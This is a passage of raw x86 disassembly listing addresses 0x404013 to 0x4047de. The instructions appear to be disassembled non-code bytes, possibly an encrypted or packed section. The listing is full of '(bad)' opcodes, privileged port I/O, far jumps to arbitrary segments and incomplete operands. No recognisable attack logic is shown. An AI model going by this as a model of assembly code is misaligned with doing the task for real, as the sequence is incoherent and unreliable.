  404013:	xchg   edi,eax
  404014:	pop    edx
  404015:	dec    edi
  404016:	pop    esi
  404017:	sbb    al,0xcf
  404019:	loope  0x40401d
  40401b:	adc    dh,BYTE PTR [eax-0x2be9d087]
  404021:	fisub  DWORD PTR [edx-0x68754910]
  404027:	test   eax,0x515d6db7
  40402c:	in     al,0x56
  40402e:	cmp    eax,0x28eabcb0
  404033:	or     DWORD PTR [edx-0x611297c3],esp
  404039:	mov    al,0x7e
  40403b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40403c:	fld    TBYTE PTR [edx+0x59520897]
  404042:	inc    ecx
  404043:	xchg   BYTE PTR [esi+ecx*8-0x75d89e1c],dl
  40404a:	lods   al,BYTE PTR ds:[esi]
  40404b:	mov    al,0x96
  40404d:	shl    DWORD PTR [ecx+ecx*1],1
  404050:	sbb    DWORD PTR ds:0xc5be4188,ecx
  404056:	jno    0x403fdb
  404058:	shr    esp,cl
  40405a:	test   al,0xb6
  40405c:	stos   DWORD PTR es:[edi],eax
  40405d:	push   ss
  40405e:	xor    DWORD PTR [ebx],0x6
  404061:	mov    esi,DWORD PTR [ecx+ecx*1]
  404064:	adc    BYTE PTR [eax],bh
  404066:	xor    al,ah
  404068:	js     0x4040df
  40406a:	or     DWORD PTR [esi+0xf],edx
  40406d:	ja     0x404077
  40406f:	push   cs
  404070:	ret    
  404071:	in     al,0x13
  404073:	sub    ecx,edx
  404075:	jo     0x4040c7
  404077:	xor    DWORD PTR [edi],ebp
  404079:	test   al,0x47
  40407b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40407c:	in     al,dx
  40407d:	push   ecx
  40407e:	xchg   ebx,eax
  40407f:	dec    ebx
  404080:	jmp    0x55bc:0xc2a7ba28
  404087:	inc    ebx
  404088:	sahf   
  404089:	mov    al,ds:0x85022942
  40408e:	fiadd  WORD PTR [eax]
  404090:	or     ebp,DWORD PTR [ebx+0x13]
  404093:	xchg   edx,eax
  404094:	push   esp
  404095:	cmp    al,BYTE PTR [ecx+0x71]
  404098:	mov    al,BYTE PTR ds:0xe2e87a37
  40409e:	adc    eax,0x1024406d
  4040a3:	and    cl,BYTE PTR [ebp+0x3c8c7ae4]
  4040a9:	pop    edi
  4040aa:	and    eax,0x3a2467a5
  4040af:	enter  0x3c6b,0x94
  4040b3:	add    ah,BYTE PTR [esi]
  4040b5:	sbb    esp,esi
  4040b7:	das    
  4040b8:	xchg   ebp,eax
  4040b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ba:	aaa    
  4040bb:	adc    BYTE PTR [ebp+0x4b],bl
  4040be:	rcl    DWORD PTR [edx+0x3c],1
  4040c1:	lahf   
  4040c2:	iret   
  4040c3:	ins    DWORD PTR es:[edi],dx
  4040c4:	cld    
  4040c5:	fcomp  DWORD PTR [ebx+ebx*1]
  4040c8:	xlat   BYTE PTR ds:[ebx]
  4040c9:	std    
  4040ca:	retf   
  4040cb:	or     bl,dh
  4040cd:	mov    ecx,0x5c592bfe
  4040d2:	jne    0x40408b
  4040d4:	fmul   QWORD PTR [ecx]
  4040d6:	dec    edi
  4040d7:	aaa    
  4040d8:	sar    BYTE PTR [ebx+0x3c],1
  4040db:	cmp    eax,0xb0cbbf67
  4040e0:	ja     0x404130
  4040e2:	jbe    0x404111
  4040e4:	dec    ecx
  4040e5:	jo     0x4040d3
  4040e7:	loope  0x40412f
  4040e9:	jae    0x404110
  4040eb:	xor    ecx,ecx
  4040ed:	mov    edx,gs
  4040ef:	ins    BYTE PTR es:[edi],dx
  4040f0:	sbb    edx,DWORD PTR [edi]
  4040f2:	and    ebx,DWORD PTR [eax-0x71c48a11]
  4040f8:	and    edi,ebp
  4040fa:	cmp    eax,0xc316d8c1
  4040ff:	aaa    
  404100:	mov    al,ds:0xee4d6a51
  404105:	outs   dx,DWORD PTR ds:[esi]
  404106:	or     eax,0x4c1fffe9
  40410b:	xchg   esp,eax
  40410c:	mov    edi,0xe23e5444
  404111:	push   esi
  404112:	ja     0x4040e0
  404114:	add    DWORD PTR [ecx-0x46],esp
  404117:	fdiv   st,st(3)
  404119:	sbb    al,0xf3
  40411b:	mov    esp,?
  40411d:	(bad)  
  40411e:	push   edx
  40411f:	pop    ss
  404120:	push   es
  404121:	les    ebp,FWORD PTR [ebx]
  404123:	mov    edi,0x66b2ca6c
  404128:	jne    0x40412d
  40412a:	cs je  0x4040dd
  40412d:	pop    edx
  40412e:	cmp    DWORD PTR [esi+0x14],edx
  404131:	mov    al,ds:0x9f0b37b3
  404136:	mul    esi
  404138:	inc    ecx
  404139:	stos   DWORD PTR es:[edi],eax
  40413a:	cli    
  40413b:	adc    DWORD PTR [edi+0x7],esp
  40413e:	loopne 0x4041af
  404140:	lahf   
  404141:	repz cmp edx,edi
  404144:	in     eax,dx
  404145:	adc    ecx,DWORD PTR [ecx-0x15b6a59b]
  40414b:	jecxz  0x4041b8
  40414d:	push   ebx
  40414e:	ret    0xfadd
  404151:	xchg   ebx,ecx
  404153:	retf   0x23f4
  404156:	jb     0x4041b8
  404158:	(bad)  
  404159:	mul    ebp
  40415b:	jne    0x404146
  40415d:	scas   eax,DWORD PTR es:[edi]
  40415e:	call   0x5f9740bc
  404163:	xlat   BYTE PTR ds:[ebx]
  404164:	jle    0x40419c
  404166:	aas    
  404167:	popa   
  404168:	dec    esp
  404169:	mov    bl,0x6c
  40416b:	imul   edx,DWORD PTR [ebx-0x6a],0xe5d6d301
  404172:	sbb    al,0xfe
  404174:	xchg   ecx,eax
  404175:	mov    bl,bl
  404177:	dec    esi
  404178:	push   esi
  404179:	ds out 0xd,al
  40417c:	mov    ah,0x24
  40417e:	mov    cl,BYTE PTR [ecx+0x60]
  404181:	xor    al,0x6d
  404183:	cmp    bl,BYTE PTR [ecx-0x55]
  404186:	iret   
  404187:	idiv   BYTE PTR [edx+0x7c]
  40418a:	push   ss
  40418b:	jb     0x4041df
  40418d:	loop   0x404134
  40418f:	sub    DWORD PTR [edx],ebp
  404191:	mov    ds:0xfbff678d,al
  404196:	push   ebx
  404197:	xchg   ebx,ebp
  404199:	ja     0x40418b
  40419b:	jl     0x404196
  40419d:	imul   esp,DWORD PTR [edx-0x76f7e574],0x43
  4041a4:	aad    0xd1
  4041a6:	and    bl,al
  4041a8:	imul   edx,DWORD PTR [edx-0x4b],0xfffffff1
  4041ac:	out    0xbb,al
  4041ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041af:	lods   al,BYTE PTR ds:[esi]
  4041b0:	fidiv  WORD PTR [ecx-0x1e7c8d9b]
  4041b6:	pusha  
  4041b7:	inc    ebx
  4041b8:	sbb    al,0x53
  4041ba:	ins    BYTE PTR es:[edi],dx
  4041bb:	or     dh,BYTE PTR [ecx+0x16]
  4041be:	xlat   BYTE PTR ds:[ebx]
  4041bf:	jno    0x404224
  4041c1:	fwait
  4041c2:	pop    ss
  4041c3:	retf   0xe69e
  4041c6:	mov    bh,0x41
  4041c8:	fadd   st,st(3)
  4041ca:	(bad)  
  4041cb:	loop   0x404176
  4041cd:	add    edi,eax
  4041cf:	xchg   ecx,eax
  4041d0:	test   DWORD PTR ds:[esi+0x63],edx
  4041d4:	dec    ebp
  4041d5:	cmp    dl,BYTE PTR [ecx-0x167a734]
  4041db:	adc    BYTE PTR [eax+0x3dc872ed],ah
  4041e1:	cmp    bl,BYTE PTR [ebx]
  4041e3:	and    al,BYTE PTR [eax]
  4041e5:	loopne 0x4041e7
  4041e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041e8:	pop    edi
  4041e9:	mov    bl,0x8a
  4041eb:	mov    edx,0x19cbff76
  4041f0:	xchg   ebp,eax
  4041f2:	xor    BYTE PTR [ebp-0x5a],ch
  4041f5:	not    DWORD PTR [eax]
  4041f7:	es mov ch,0x97
  4041fa:	push   esi
  4041fb:	pusha  
  4041fc:	imul   ebp,DWORD PTR [edi+ebx*2],0x6364d961
  404203:	imul   edi,ecx,0xf
  404206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404207:	inc    ebp
  404208:	and    eax,0xcd772dc6
  40420d:	fnstsw ax
  40420f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404210:	sbb    al,0x3d
  404212:	shl    DWORD PTR [edi],cl
  404214:	in     eax,dx
  404215:	or     bl,BYTE PTR [ecx+edi*8-0x43c03fc]
  40421c:	(bad)  
  40421d:	xor    edi,DWORD PTR [ebp+0x22118afa]
  404223:	jnp    0x404292
  404225:	xlat   BYTE PTR ds:[ebx]
  404226:	mov    ebp,0x8fe5840c
  40422b:	inc    ebp
  40422c:	fiadd  WORD PTR es:[ebp-0x7d]
  404230:	gs mov edi,0xfc0d4a1f
  404236:	add    esi,DWORD PTR [eax-0x3ed49068]
  40423c:	repnz or eax,0x33b86b2d
  404242:	js     0x404212
  404244:	sbb    eax,0x8c73abf1
  404249:	mov    dh,0x46
  40424b:	out    dx,eax
  40424c:	loope  0x4041f9
  40424e:	jmp    0x81f1cf7b
  404253:	aad    0xaa
  404255:	cmp    edi,edx
  404257:	mov    DWORD PTR [esi+0x12],ecx
  40425a:	adc    al,0x8e
  40425c:	idiv   bh
  40425e:	push   esi
  40425f:	mov    ch,0x9d
  404261:	dec    DWORD PTR [edi-0x5741bcb2]
  404267:	out    0x54,eax
  404269:	aam    0x15
  40426b:	inc    edi
  40426c:	or     ebp,esp
  40426e:	cmp    ebx,DWORD PTR [edi+0x4]
  404271:	scas   eax,DWORD PTR es:[edi]
  404272:	out    0xad,eax
  404274:	cmp    DWORD PTR [ecx-0x18],edx
  404277:	dec    edi
  404278:	out    dx,al
  404279:	cmp    al,0x30
  40427b:	jno    0x40420f
  40427d:	or     BYTE PTR [ebp-0x7b],0xb6
  404281:	cmp    eax,0xcfa61323
  404286:	xchg   ecx,eax
  404287:	dec    ecx
  404288:	repz push ebp
  40428a:	sub    edx,edx
  40428c:	and    edx,DWORD PTR [esp+edx*4+0x72ba7957]
  404293:	jns    0x404256
  404295:	mov    ds:0xa5a9c1d2,al
  40429a:	inc    esi
  40429b:	pop    ss
  40429c:	(bad)  [edi-0x65]
  40429f:	pcmpeqb mm4,mm4
  4042a2:	sub    edx,edx
  4042a4:	pop    edx
  4042a5:	outs   dx,DWORD PTR ds:[esi]
  4042a6:	push   es
  4042a7:	div    DWORD PTR [ebp+ebx*4-0x45788397]
  4042ae:	mov    al,0x27
  4042b0:	cs popf 
  4042b2:	sahf   
  4042b3:	push   cs
  4042b4:	mov    esi,0xa7f40ef3
  4042b9:	cld    
  4042ba:	mov    eax,ds:0x2f8b5495
  4042bf:	pop    ecx
  4042c0:	(bad)  
  4042c1:	inc    ebx
  4042c2:	loope  0x40424a
  4042c4:	sbb    al,0x36
  4042c6:	or     BYTE PTR [ecx+esi*8+0x78],ah
  4042ca:	mov    esi,0x60eeb1ae
  4042cf:	mov    al,0x10
  4042d1:	lods   al,BYTE PTR ds:[esi]
  4042d2:	adc    eax,0x1cc1eba5
  4042d7:	adc    eax,0x2c3c8309
  4042dc:	scas   al,BYTE PTR es:[edi]
  4042dd:	loopne 0x4042f9
  4042df:	dec    esp
  4042e0:	bound  edi,QWORD PTR [esi-0x59]
  4042e3:	add    al,0xd1
  4042e5:	fimul  WORD PTR [edi]
  4042e7:	cdq    
  4042e8:	dec    cl
  4042ea:	xchg   ecx,eax
  4042eb:	mov    dl,0x51
  4042ed:	sbb    ah,bl
  4042ef:	jno    0x4042d9
  4042f1:	xchg   esp,eax
  4042f2:	jnp    0x404359
  4042f4:	inc    ebp
  4042f5:	(bad)  
  4042f6:	fsubr  st,st(3)
  4042f8:	arpl   WORD PTR [esi],bp
  4042fa:	aam    0xf0
  4042fc:	repz or BYTE PTR [ebp+0x44],0x3d
  404301:	ss sahf 
  404303:	mov    dh,0x46
  404305:	adc    bl,BYTE PTR [ebx-0x6bcecab5]
  40430b:	adc    DWORD PTR ss:[edx-0x4bf5bdac],ecx
  404312:	loope  0x404325
  404314:	popf   
  404315:	stos   DWORD PTR es:[edi],eax
  404316:	pop    ds
  404317:	int3   
  404318:	ret    
  404319:	pop    esp
  40431a:	shl    BYTE PTR [ebx-0xf06d775],cl
  404320:	pop    ecx
  404321:	adc    esp,DWORD PTR [ebx+0x0]
  404324:	pop    ecx
  404325:	rcr    bh,cl
  404327:	lods   al,BYTE PTR ds:[esi]
  404328:	ret    
  404329:	mov    ch,0xa8
  40432b:	inc    ecx
  40432c:	adc    al,BYTE PTR [ebp-0x4d]
  40432f:	imul   esi,edx,0xffffffc5
  404332:	out    0xc9,al
  404334:	in     al,0x44
  404336:	add    al,0x17
  404338:	lahf   
  404339:	stos   DWORD PTR es:[edi],eax
  40433a:	out    0x4f,eax
  40433c:	xchg   BYTE PTR [ecx+edi*4-0x70],dl
  404340:	add    ebx,DWORD PTR [ecx-0x2c]
  404343:	enter  0x5647,0x49
  404347:	ins    BYTE PTR es:[edi],dx
  404348:	fldcw  WORD PTR [edi]
  40434a:	mov    al,0x19
  40434c:	mov    eax,ds:0xa6d2d831
  404351:	add    bl,BYTE PTR [ecx+ecx*8-0x33]
  404355:	fldcw  WORD PTR [ebx-0x2f]
  404358:	das    
  404359:	jmp    0xd9238a1a
  40435e:	xor    al,0x4c
  404360:	aam    0x4f
  404362:	and    BYTE PTR [ecx-0x2892f185],dh
  404368:	into   
  404369:	lahf   
  40436a:	xor    ch,BYTE PTR [esp+ebp*2-0x1e]
  40436e:	loope  0x40434e
  404370:	sqrtps xmm1,xmm7
  404373:	in     al,dx
  404374:	add    eax,0x3307734a
  404379:	sahf   
  40437a:	lds    ebp,FWORD PTR [eax+0x53]
  40437d:	imul   esi,DWORD PTR [ecx-0x6742ada4],0x96e731c0
  404387:	push   cs
  404388:	daa    
  404389:	adc    eax,edx
  40438b:	or     eax,DWORD PTR [ebx-0x4d]
  40438e:	iret   
  40438f:	aas    
  404390:	mov    ?,eax
  404392:	xor    eax,0x823461a4
  404397:	aaa    
  404398:	fst    st(0)
  40439a:	icebp  
  40439b:	pop    ss
  40439c:	push   ebx
  40439d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40439e:	popf   
  40439f:	mov    ecx,0x67bba7f4
  4043a4:	inc    eax
  4043a5:	int    0xd3
  4043a7:	aam    0x2a
  4043a9:	pop    edi
  4043aa:	mov    al,0xc7
  4043ac:	mov    esi,0x365541cb
  4043b1:	retf   0x9553
  4043b4:	sub    DWORD PTR [edx-0x67],0x19
  4043b8:	nop
  4043b9:	pop    esp
  4043ba:	mov    DWORD PTR [eax],0x808b8403
  4043c0:	data16 mov bh,0xcd
  4043c3:	mov    dl,0x3c
  4043c5:	inc    edx
  4043c6:	push   ss
  4043c7:	push   esi
  4043c8:	repz retf 
  4043ca:	pop    es
  4043cb:	fldcw  WORD PTR [ebx+edi*2]
  4043ce:	mov    ch,BYTE PTR [ebx+0x2a]
  4043d1:	push   edx
  4043d2:	sub    DWORD PTR [ebp+0x52a0427c],ebx
  4043d8:	call   FWORD PTR [esi+0x7e0af2e6]
  4043de:	inc    eax
  4043df:	ds ret 0x7555
  4043e3:	or     eax,0x7b4149a5
  4043e8:	mov    eax,0x2768e072
  4043ed:	fs xchg esi,eax
  4043ef:	inc    edx
  4043f0:	mov    ah,bh
  4043f2:	mov    BYTE PTR [edi],ch
  4043f4:	test   BYTE PTR [edx+0xd],0x53
  4043f8:	mov    eax,0x39acb13c
  4043fd:	xchg   DWORD PTR [eax],eax
  4043ff:	push   0x5
  404401:	xchg   esi,eax
  404402:	repnz loopne 0x404428
  404405:	outs   dx,DWORD PTR ds:[esi]
  404406:	dec    eax
  404407:	retf   
  404408:	cmc    
  404409:	cmp    DWORD PTR [edx],0xdac5a56e
  40440f:	pop    ss
  404410:	cmp    edi,DWORD PTR [esi-0x55]
  404413:	sub    edi,esi
  404415:	and    BYTE PTR [edi+0x62],ch
  404418:	push   eax
  404419:	jp     0x404470
  40441b:	cmc    
  40441c:	sar    DWORD PTR [edx+esi*1+0x7e90a37e],1
  404423:	loop   0x4043d5
  404425:	mov    ah,0x96
  404427:	push   cs
  404428:	jns    0x4043ea
  40442a:	mov    es,WORD PTR [edx-0x4789e93a]
  404430:	mulps  xmm2,XMMWORD PTR [ecx+0x4ac09c0a]
  404437:	jbe    0x404441
  404439:	fstp   st(4)
  40443b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443c:	push   0x815aec66
  404441:	daa    
  404442:	call   0x7f81:0x8ef4529d
  404449:	retf   
  40444a:	fistp  WORD PTR gs:[esi-0x21a5c1a4]
  404451:	rsm    
  404453:	(bad)  [edx-0x63d8c8bd]
  404459:	fs jnp 0x404422
  40445c:	cdq    
  40445d:	push   esi
  40445e:	mov    eax,0x921cbe99
  404463:	pop    edx
  404464:	push   es
  404465:	and    al,0xb5
  404467:	or     al,0x41
  404469:	or     BYTE PTR [eax-0xbaf4bd5],al
  40446f:	ss leave 
  404471:	inc    esp
  404472:	xor    DWORD PTR [ebx],ebx
  404474:	imul   ecx,DWORD PTR [ebp-0x4d],0x3a
  404478:	cmp    al,0xc7
  40447a:	rol    BYTE PTR [esi],cl
  40447c:	mov    esp,0x86763e00
  404481:	imul   esi,ecx,0x8
  404484:	inc    ebx
  404485:	mov    eax,ds:0x50e49750
  40448a:	std    
  40448b:	mov    WORD PTR [ebx+ebx*2-0x35],gs
  40448f:	lds    ebp,FWORD PTR [edx+0x42]
  404492:	and    dl,BYTE PTR [ebp-0x48]
  404495:	jge    0x4044fd
  404497:	push   ds
  404498:	pop    ebp
  404499:	or     DWORD PTR [ecx],esi
  40449b:	ja     0x404488
  40449d:	xchg   al,dh
  40449f:	xchg   edi,eax
  4044a0:	add    DWORD PTR [edi+ebx*4-0x57],esi
  4044a4:	adc    al,0x2a
  4044a6:	dec    ebx
  4044a7:	jecxz  0x404464
  4044a9:	aad    0x11
  4044ab:	adc    ecx,DWORD PTR [eax]
  4044ad:	mov    esi,DWORD PTR [eax]
  4044af:	xor    BYTE PTR [ecx],bl
  4044b1:	addr16 or eax,0xb5ffe0c0
  4044b7:	lea    esi,[esi-0x53875ff]
  4044bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044be:	cli    
  4044bf:	dec    esp
  4044c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c1:	xchg   ebp,eax
  4044c2:	inc    edx
  4044c3:	xor    esp,eax
  4044c5:	ret    0xfc21
  4044c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c9:	inc    esi
  4044ca:	rcr    BYTE PTR [ebx+0x3cc030a2],0x56
  4044d1:	xor    ah,BYTE PTR [ebp+0x35]
  4044d4:	lea    esi,[ebp-0x11]
  4044d7:	inc    eax
  4044d8:	clc    
  4044d9:	add    ecx,DWORD PTR [edi]
  4044db:	lea    esp,[esp+esi*1-0x22]
  4044df:	idiv   ah
  4044e1:	ja     0x404539
  4044e3:	scas   al,BYTE PTR es:[edi]
  4044e4:	mov    ecx,0xb02d967c
  4044e9:	fmul   QWORD PTR [esp+edx*1+0xc]
  4044ed:	add    al,0xeb
  4044ef:	sub    BYTE PTR [eax],al
  4044f1:	inc    ecx
  4044f2:	fiadd  WORD PTR [ebx+0x79e09660]
  4044f8:	ficom  WORD PTR [ebx+0x10919c9a]
  4044fe:	push   edi
  4044ff:	and    BYTE PTR ds:0x72737fa6,bl
  404505:	adc    al,al
  404507:	jp     0x40457a
  404509:	inc    ecx
  40450a:	enter  0xab31,0xa7
  40450e:	sub    DWORD PTR [esp+eax*8+0x43],0x6b4ba043
  404516:	pusha  
  404517:	sbb    ecx,0xffffffe1
  40451a:	inc    eax
  40451b:	jg     0x40458e
  40451d:	and    eax,ecx
  40451f:	mov    bl,0x25
  404521:	(bad)  
  404522:	xchg   esi,eax
  404523:	dec    esi
  404524:	cmp    eax,0x4ef61da
  404529:	dec    ebp
  40452a:	imul   ebp,ebx,0x8260d9e9
  404530:	stc    
  404531:	sub    dh,bh
  404533:	les    esi,FWORD PTR [eax+0x480ed524]
  404539:	add    esp,ebx
  40453b:	push   ds
  40453c:	arpl   bx,cx
  40453e:	pop    esi
  40453f:	jno    0x404542
  404541:	gs stc 
  404543:	call   0x77cf:0x373459da
  40454a:	call   0xf3f6:0x26585d97
  404551:	test   BYTE PTR [eax-0x69908106],0x64
  404558:	mov    ds:0xfbc4a792,eax
  40455d:	call   FWORD PTR [eax+0x5c]
  404560:	ins    BYTE PTR es:[edi],dx
  404561:	gs out dx,al
  404563:	sar    BYTE PTR [ebx+0xb0c848f],0xda
  40456a:	fwait
  40456b:	rep outs dx,DWORD PTR ds:[esi]
  40456d:	pop    ds
  40456e:	sahf   
  40456f:	cmp    DWORD PTR [edx*1+0x539b9b67],ecx
  404576:	push   cs
  404577:	leave  
  404578:	or     DWORD PTR [eax+0x3cb446c3],0x37
  40457f:	push   0x1c
  404581:	dec    ecx
  404582:	cmp    ebp,ecx
  404584:	repz or al,0x33
  404587:	sub    eax,0xe437daf4
  40458c:	fild   DWORD PTR [eax]
  40458e:	xchg   ebp,eax
  40458f:	clc    
  404590:	jne    0x4045ef
  404592:	sub    al,0x5a
  404594:	aad    0x96
  404596:	inc    esp
  404597:	jne    0x404592
  404599:	push   esp
  40459a:	sbb    BYTE PTR [esi],0xa
  40459d:	mov    ebx,0x742e0dd6
  4045a2:	leave  
  4045a3:	xor    al,0x7e
  4045a5:	mov    bh,0x38
  4045a7:	adc    DWORD PTR [ebx-0x1e],esp
  4045aa:	sti    
  4045ab:	sbb    al,0xce
  4045ad:	xor    DWORD PTR [ecx],0xffffffc8
  4045b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b1:	cmp    ah,BYTE PTR [edx+0x531c3785]
  4045b7:	sbb    DWORD PTR [edx-0x4b],ebp
  4045ba:	jmp    0xe7c277f
  4045bf:	(bad)  
  4045c0:	push   ss
  4045c1:	pop    es
  4045c2:	or     cl,ah
  4045c4:	daa    
  4045c5:	pushf  
  4045c6:	sub    DWORD PTR [edx],0x1c
  4045c9:	outs   dx,DWORD PTR ds:[esi]
  4045ca:	mov    esi,gs
  4045cc:	pop    ss
  4045cd:	mul    edx
  4045cf:	ds jmp 0x40463b
  4045d2:	jae    0x40457b
  4045d4:	(bad)  [eax-0x80]
  4045d7:	and    al,0x8
  4045d9:	pop    es
  4045da:	jmp    0x15cbc35c
  4045df:	call   0x70f2:0x1c1d1338
  4045e6:	fisub  DWORD PTR [esi+0x26]
  4045e9:	inc    edx
  4045ea:	xor    ebp,DWORD PTR [eax-0x2]
  4045ed:	xchg   DWORD PTR [esi-0x77aa8743],esp
  4045f3:	into   
  4045f4:	pop    edi
  4045f5:	enter  0xcdc9,0x2a
  4045f9:	mov    bh,0x90
  4045fb:	xor    al,0x8d
  4045fd:	jmp    0xcee31baa
  404602:	push   edi
  404603:	sub    ch,BYTE PTR [edi+0x4d]
  404606:	adc    eax,0x20cd6ae9
  40460b:	test   BYTE PTR [edi+0x6a15eda7],bl
  404611:	sar    BYTE PTR [eax],cl
  404613:	jb     0x404596
  404615:	aaa    
  404616:	daa    
  404617:	xchg   edi,eax
  404618:	push   0x2
  40461a:	in     eax,dx
  40461b:	and    dh,BYTE PTR [ebx+0x5601b497]
  404621:	je     0x4045cd
  404623:	psubusb mm1,QWORD PTR [edx+0x6c]
  404627:	lods   al,BYTE PTR ds:[esi]
  404628:	arpl   WORD PTR [edx+eax*1+0x46d2dcbc],cx
  40462f:	or     ebx,DWORD PTR [ebx]
  404631:	outs   dx,BYTE PTR ds:[esi]
  404632:	mov    al,0x4c
  404634:	pop    eax
  404635:	or     DWORD PTR [ecx-0x778e3d1],ebp
  40463b:	push   ebx
  40463c:	popf   
  40463d:	inc    edx
  40463e:	aam    0x76
  404640:	jl     0x404644
  404642:	and    ah,BYTE PTR [edx+0x45]
  404645:	or     al,BYTE PTR [esp+eax*1]
  404648:	and    DWORD PTR [eax+0x54922091],esi
  40464e:	push   ds
  40464f:	outs   dx,BYTE PTR ds:[esi]
  404650:	jbe    0x4046c0
  404652:	jp     0x404662
  404654:	jne    0x4045e4
  404656:	hlt    
  404657:	dec    eax
  404658:	mov    gs,WORD PTR [edi+esi*4+0x6b90ab87]
  40465f:	in     al,dx
  404660:	fwait
  404661:	cld    
  404662:	xchg   DWORD PTR [edi-0x4910e308],esp
  404668:	dec    esi
  404669:	push   esi
  40466a:	scas   eax,DWORD PTR es:[edi]
  40466b:	test   edx,esi
  40466d:	loopne 0x40462d
  40466f:	add    DWORD PTR [edi+eax*8-0x4],ecx
  404673:	imul   edx,DWORD PTR [ecx],0xe6a097b1
  404679:	mov    ?,ebx
  40467b:	mov    ecx,0x9b342d4e
  404680:	sub    ah,BYTE PTR [edx-0x71]
  404683:	jge    0x6da8a25
  404689:	adc    eax,0x2fe3ebfe
  40468e:	or     bh,BYTE PTR [ebx-0x90b67b1]
  404694:	popa   
  404695:	jns    0x40470b
  404697:	mov    ds:0x262a14e,al
  40469c:	ret    0x6364
  40469f:	stos   BYTE PTR es:[edi],al
  4046a0:	push   eax
  4046a1:	push   ebx
  4046a2:	jnp    0x404711
  4046a4:	sub    al,dl
  4046a6:	push   edi
  4046a7:	fucom  st(7)
  4046a9:	test   DWORD PTR [esi],ebx
  4046ab:	aad    0x16
  4046ad:	or     esp,eax
  4046af:	and    al,0x79
  4046b1:	cld    
  4046b2:	xchg   esp,eax
  4046b3:	std    
  4046b4:	xor    DWORD PTR [eax-0x31cf1eb5],ebp
  4046ba:	aaa    
  4046bb:	cmp    eax,0x614d3c7d
  4046c0:	xchg   esp,eax
  4046c1:	mov    edi,0x2c017680
  4046c6:	das    
  4046c7:	mov    ecx,0x2bd8624e
  4046cc:	cs add eax,0x1c774054
  4046d2:	pushw  cs
  4046d4:	xchg   edi,eax
  4046d5:	aaa    
  4046d6:	je     0x40466d
  4046d8:	adc    ah,BYTE PTR [ebx+0x2e]
  4046db:	sub    dl,cl
  4046dd:	push   ss
  4046de:	imul   esp,DWORD PTR [esi-0x42ff078d],0xad91be5a
  4046e8:	fmul   DWORD PTR [ebx+0x26173487]
  4046ee:	cdq    
  4046ef:	call   0x3af6367f
  4046f4:	push   ds
  4046f5:	mov    esp,0x87d4d99e
  4046fa:	and    eax,0xc0527fb6
  4046ff:	div    cl
  404701:	ret    
  404702:	shl    BYTE PTR [eax+0x41],0x4b
  404706:	mov    cl,0x16
  404708:	push   ss
  404709:	mov    esp,0x819e3026
  40470e:	scas   eax,DWORD PTR es:[edi]
  40470f:	cs fs cmp al,0x5b
  404713:	mov    BYTE PTR [ecx],cl
  404715:	ds call 0xfeb8da62
  40471b:	cmp    DWORD PTR [esi+0x445c0f5b],ecx
  404721:	call   0xda2:0xfcf4bf5c
  404728:	and    al,0x94
  40472a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40472b:	jne    0x40478e
  40472d:	sbb    cl,dh
  40472f:	scas   al,BYTE PTR es:[edi]
  404730:	lea    esi,[ebx]
  404732:	and    ah,dl
  404734:	test   eax,0x37a48888
  404739:	mov    al,ds:0x4e62fa58
  40473e:	stos   WORD PTR es:[edi],ax
  404740:	push   0xfce899fe
  404745:	xor    DWORD PTR [ebx],0x71887f2e
  40474b:	push   ebx
  40474c:	xor    DWORD PTR [esi],eax
  40474e:	adc    BYTE PTR [ecx],dl
  404750:	daa    
  404751:	fst    QWORD PTR [esi+0x7b1e0775]
  404757:	bound  esi,QWORD PTR [esi]
  404759:	lods   eax,DWORD PTR ds:[esi]
  40475a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40475b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40475c:	add    ah,cl
  40475e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40475f:	faddp  st(1),st
  404761:	pop    es
  404762:	push   eax
  404763:	push   ds
  404764:	jnp    0x404759
  404766:	and    al,0x8
  404768:	sbb    BYTE PTR [esi+0x63ef03e7],dh
  40476e:	push   ds
  40476f:	hlt    
  404770:	xor    eax,DWORD PTR [esi+0x7361446e]
  404776:	rcl    BYTE PTR [ebx-0x44818fd],1
  40477c:	leave  
  40477d:	ja     0x404729
  40477f:	jp     0x4047f9
  404781:	loope  0x40475d
  404783:	fs jne 0x404714
  404786:	(bad)  
  404788:	pop    es
  404789:	gs add eax,0xb066dd63
  40478f:	repnz lds ebp,FWORD PTR [eax+esi*4]
  404793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404794:	sbb    cl,cl
  404796:	repz pop ss
  404798:	inc    edi
  404799:	dec    edi
  40479a:	inc    ebp
  40479b:	scas   eax,DWORD PTR es:[edi]
  40479c:	push   ds
  40479d:	cmp    esp,DWORD PTR ds:[ebp+edi*1+0x3884741b]
  4047a5:	stos   BYTE PTR es:[edi],al
  4047a6:	ret    
  4047a7:	jo     0x40480a
  4047a9:	das    
  4047aa:	inc    eax
  4047ab:	xor    al,BYTE PTR [esi+0x5bd3c0e9]
  4047b1:	cmp    bh,BYTE PTR [edi-0x10]
  4047b4:	mov    DWORD PTR [edi-0x671ac6cb],0xd5ecc68d
  4047be:	lea    ecx,[edi-0xedebbad]
  4047c4:	push   es
  4047c5:	mov    ecx,0xad8861a0
  4047ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047cb:	or     al,0x93
  4047cd:	fwait
  4047ce:	push   ebp
  4047cf:	(bad)  
  4047d0:	aam    0x65
  4047d2:	aad    0x0
  4047d4:	stc    
  4047d5:	ds daa 
  4047d7:	in     al,dx
  4047d8:	sub    al,0x93
  4047da:	popf   
  4047db:	cld    
  4047dc:	sar    ecx,1
  4047de:	jno    0x4047d8
